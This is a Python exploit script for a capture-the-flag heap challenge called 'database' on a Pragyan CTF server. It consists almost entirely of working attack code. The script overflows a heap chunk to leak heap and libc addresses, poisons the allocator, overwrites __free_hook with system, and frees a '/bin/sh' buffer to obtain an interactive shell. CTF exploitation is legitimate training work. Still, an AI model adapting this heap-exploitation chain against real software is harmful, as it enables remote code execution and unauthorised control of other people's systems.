#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./database')
host = args.HOST or 'binary.challs.pragyanctf.tech'
port = int(args.PORT or 6004)

gdbscript = '''
# tbreak main
continue
'''.format(**locals())
idx=-1
def cmd(choice):
	sla(b"Enter your choice => ", str(choice).encode('latin-1'))

def add(size, data):
	global idx
	cmd(2)
	sla(b"Please enter the length of string => ", str(size).encode('latin-1'))
	sa(b"Please enter the string you want to save => ", data)
	idx=idx+1
	return idx

def edit(idx, size, data):
	cmd(3)
	sla(b"Please enter the index of element => ", str(idx).encode('latin-1'))
	sla(b"Please enter the length of string => ", str(size).encode('latin-1'))
	sa(b"Please enter the string => ", data)

def delete(idx):
	cmd(4)
	sla(b"Please enter the index of element => ", str(idx).encode('latin-1'))

def show():
	cmd(1)

libc=SetupLibcELF()
io = start()

a=add(0x68, b"A"*8)
b=add(0x68, b"A"*8)
c=add(0x68, b"A"*8)
d=add(0x100, b"C"*8)
e=add(32, b"A")
delete(a)
delete(c)
edit(b, 0x68+8+8+8, b"X"*(0x68+8+7) + b"\xff")
show()
reu(b"\xff")
heap_base=uu64(rl())
hb()
edit(b, 0x68+8+8+8, b"X"*0x68 + p(0x71) + p(heap_base+0x10))
x=add(0x68, b"A"*8)
add(0x68, b"\x10"*0x30)
delete(d)
print(x)
edit(1, 0x68+0x68+0x68, b"G"*(0xe0) + b"\xff")
show()
reu(b"\xff")
ren(7)
libc.address=uu64(ren(6))-0x3ebca0
lb()
edit(0, 0x68, b"/bin/sh\x00")
edit(2, 0x1000, b"\x10"*0x30 + p(libc.sym['__free_hook'])*10)
add(32, p(libc.sym.system))
delete(0)
# edit(4, 0x68, p(libc.sym.system)*5)
# edit(1, 0x1000, b"G"*(0x58) + HouseOfOrange(heap_base+0x350))
io.interactive()
